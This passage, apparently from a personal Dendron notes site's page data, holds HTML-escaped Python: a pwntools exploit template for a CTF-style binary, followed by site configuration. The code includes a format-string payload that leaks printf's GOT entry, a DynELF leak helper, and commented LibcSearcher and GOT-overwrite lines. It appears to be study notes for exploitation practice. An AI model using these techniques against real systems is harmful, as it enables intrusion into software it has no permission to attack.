class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token number\"\u003e0x10\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n            \u003cspan class=\"token keyword\"\u003econtinue\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003ebreak\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eelse\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ewhile\u003c/span\u003e \u003cspan class=\"token boolean\"\u003eTrue\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003etry\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n            io\u003cspan class=\"token operator\"\u003e=\u003c/span\u003eprocess\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003etarget\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eexcept\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n            log\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003einfo\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"local:too many process,I can not malloc any memory\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n            log\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003einfo\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"bye~~\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n            exit\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003ebreak\u003c/span\u003e\n\n\u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003edebug\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003egdbscript\u003cspan class=\"token operator\"\u003e=\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e stop\u003cspan class=\"token operator\"\u003e=\u003c/span\u003e\u003cspan class=\"token boolean\"\u003eFalse\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token builtin\"\u003eisinstance\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eio\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e process\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e stop\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n            pause\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n        gdb\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eattach\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eio\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e gdbscript\u003cspan class=\"token operator\"\u003e=\u003c/span\u003egdbscript\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\nstop \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e pause\nS \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e pause\nleak \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token keyword\"\u003elambda\u003c/span\u003e name\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e address\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e log\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003einfo\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"{{}} ===\u003e {{}}\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token builtin\"\u003eformat\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003ename\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token builtin\"\u003ehex\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eaddress\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\ns   \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e io\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003esend\nsl  \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e io\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003esendline\nsla \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e io\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003esendlineafter\nsa  \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e io\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003esendafter\nslt \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e io\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003esendlinethen\nst  \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e io\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003esendthen\nr   \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e io\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003erecv\nrn  \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e io\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003erecvn\nrr  \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e io\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003erecvregex\nru  \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e io\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003erecvuntil\nra  \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e io\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003erecvall\nrl  \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e io\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003erecvline\nrs  \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e io\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003erecvlines\nrls \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e io\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003erecvline_startswith\nrle \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e io\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003erecvline_endswith\nrlc \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e io\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003erecvline_contains\nia  \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e io\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003einteractive\nic  \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e io\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eclose\ncr  \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e io\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ecan_recv\n\n\n\nbuffer_padding \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token keyword\"\u003elambda\u003c/span\u003e offset \u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e offset\u003cspan class=\"token operator\"\u003e*\u003c/span\u003e\u003cspan class=\"token string\"\u003e'A'\u003c/span\u003e\n\n\n\u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003eexec_fmt\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epayload\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    io\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003esendline\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epayload\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    info \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e io\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003erecv\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e info\n\u003cspan class=\"token comment\"\u003e# auto = FmtStr(exec_fmt)\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e# offset = auto.offset\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e# fmtstr_payload(7, {printf_got: system_addr})\u003c/span\u003e\n\n\u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003eDynELF_leak\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eaddr\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    p \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e process\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003etarget\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    p\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003erecvline\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    payload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"%9$s.AAA\"\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e p32\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eaddr\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    p\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003esendline\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epayload\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    data \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e p\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003erecvuntil\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\".AAA\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\u003cspan class=\"token operator\"\u003e-\u003c/span\u003e\u003cspan class=\"token number\"\u003e4\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e \n    log\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003einfo\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"leaking: 0x%x --\u003e %s\"\u003c/span\u003e \u003cspan class=\"token operator\"\u003e%\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eaddr\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e data\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003e\u003cspan class=\"token builtin\"\u003ehex\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    p\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eclose\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e data\n\u003cspan class=\"token comment\"\u003e# data = DynELF(DynELF_leak, elf.plt[\"printf\"],elf=elf)     # Entry point address\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e# system_addr = data.lookup('system', 'libc')\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e# printf_addr = data.lookup('printf', 'libc')\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e# log.info(\"system address: 0x%x\" % system_addr)\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e# log.info(\"printf address: 0x%x\" % printf_addr)\u003c/span\u003e\n\n\n\u003cspan class=\"token keyword\"\u003efrom\u003c/span\u003e LibcSearcher \u003cspan class=\"token keyword\"\u003eimport\u003c/span\u003e LibcSearcher\n\u003cspan class=\"token comment\"\u003e# libc_searcher = LibcSearcher('__libc_start_main', libc_start_main_addr)\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e# libcbase = libc_start_main_addr - libc_searcher.dump('__libc_start_main')\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e# system_addr = libcbase + libc_searcher.dump('system')\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e# binsh_addr = libcbase + libc_searcher.dump('str_bin_sh')\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e# libc_searcher = LibcSearcher('printf', printf_addr)\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e# libcbase = printf_addr - libc_searcher.dump('printf')\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e# system_addr = libcbase + libc_searcher.dump('system')\u003c/span\u003e\n\n\u003cspan class=\"token comment\"\u003e# ========================================\u003c/span\u003e\n\n\nS\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\n\n\u003cspan class=\"token comment\"\u003e# debug(gdbscript=\"b *main\\r\\nb printf\")\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e# print(hex(elf.got[\"printf\"]))\u003c/span\u003e\nprintf_got \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e elf\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003egot\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"printf\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e# 数字在后面，前面为字符串，防止被截断，AAA在后面为了使用ru(\".AAA\")，利于定位，如果是\".AAA%9$s\",不利于定位\u003c/span\u003e\npayload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003eb\"%9$s.AAA\"\u003c/span\u003e \u003cspan class=\"token operator\"\u003e+\u003c/span\u003e p32\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eprintf_got\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\nrl\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\nsl\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epayload\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\ndata \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e ru\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\".AAA\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\u003cspan class=\"token number\"\u003e4\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\nprintf_addr \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e u32\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003edata\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\nlog\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003einfo\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"printf address: %s\"\u003c/span\u003e \u003cspan class=\"token operator\"\u003e%\u003c/span\u003e \u003cspan class=\"token builtin\"\u003ehex\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eprintf_addr\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\n\n\nia\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token comment\"\u003e# S()\u003c/span\u003e\n\n\n\u003c/code\u003e\u003c/pre\u003e","noteIndex":{"id":"ua6fcc7oj4utcqkv8dhmcb8","title":"b1babo's note","desc":"","updated":1669076632533,"created":1668950311250,"custom":{"nav_order":0,"permalink":"/"},"fname":"root","type":"note","vault":{"fsPath":".","selfContained":true,"name":"dendron-note"},"contentHash":"15dbb1bbcda17b2620bd900a3c14c525","links":[],"anchors":{},"children":["z6zdce798dlnm1qvlbj0147","u92paxy6iqch8vik9v6f4gm"],"parent":null,"data":{},"body":"\nwrite and record something.\n"},"collectionChildren":null,"customHeadContent":null,"config":{"version":5,"dev":{"enablePreviewV2":true,"enableSelfContainedVaults":true},"commands":{"lookup":{"note":{"selectionMode":"extract","confirmVaultOnCreate":true,"vaultSelectionModeOnCreate":"smart","leaveTrace":false,"bubbleUpCreateNew":true,"fuzzThreshold":0.2}},"randomNote":{},"insertNoteLink":{"aliasMode":"none","enableMultiSelect":false},"insertNoteIndex":{"enableMarker":false},"copyNoteLink":{"aliasMode":"title"},"templateHierarchy":"template"},"workspace":{"vaults":[{"fsPath":".","selfContained":true,"name":"dendron-note"}],"journal":{"dailyDomain":"daily","name":"journal","dateFormat":"y.MM.dd","addBehavior":"childOfDomain"},"scratch":{"name":"scratch","dateFormat":"y.MM.dd.HHmmss","addBehavior":"asOwnDomain"},"task":{"name":"task","dateFormat":"y.MM.dd","addBehavior":"asOwnDomain","statusSymbols":{"":" ","wip":"w","done":"x","assigned":"a","moved":"m","blocked":"b","delegated":"l","dropped":"d","pending":"y"},"taskCompleteStatus":["done","x"],"prioritySymbols":{"H":"high","M":"medium","L":"low"},"todoIntegration":false,"createTaskSelectionType":"selection2link"},"graph":{"zoomSpeed":1,"createStub":false},"enableAutoCreateOnDefinition":false,"enableXVaultWikiLink":false,"enableRemoteVaultInit":true,"enableUserTags":true,"enableHashTags":true,"workspaceVaultSyncMode":"noCommit","enableAutoFoldFrontmatter":false,"enableEditorDecorations":true,"maxPreviewsCached":10,"maxNoteLength":204800,"enableFullHierarchyNoteTitle":false,"enableHandlebarTemplates":true,"enableSmartRefs":false},"preview":{"enableFMTitle":true,"enableNoteTitleForLink":true,"enableFrontmatterTags":true,"enableHashesForFMTags":false,"enablePrettyRefs":true,"enableKatex":true,"automaticallyShowPreview":false,"enableMermaid":true},"publishing":{"enableFMTitle":true,"enableNoteTitleForLink":true,"enablePrettyRefs":true,"enableKatex":true,"copyAssets":true,"siteHierarchies":["root"],"writeStubs":false,"siteRootDir":"docs","seo":{"title":"Dendron","description":"Personal Knowledge Space"},"github":{"enableEditLink":true,"editLinkText":"Edit this page on GitHub","editBranch":"main","editViewMode":"tree"},"enableSiteLastModified":true,"enableFrontmatterTags":true,"enableHashesForFMTags":false,"enableRandomlyColoredTags":true,"enableTaskNotes":true,"enablePrettyLinks":true,"searchMode":"search","siteUrl":"https://b1babo.github.io","enableBackLinks":true,"assetsPrefix":"/notes","enableHierarchyDisplay":true,"enableMermaid":true,"siteFaviconPath":"favicon.ico","siteIndex":"root"}}},"__N_SSG":true},"page":"/notes/[id]","query":{"id":"epxdpi05tjyaz9lk4o0bfa0"},"buildId":"TVRBOQx7vrqEyJPi_2-lA","assetPrefix":"/notes","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>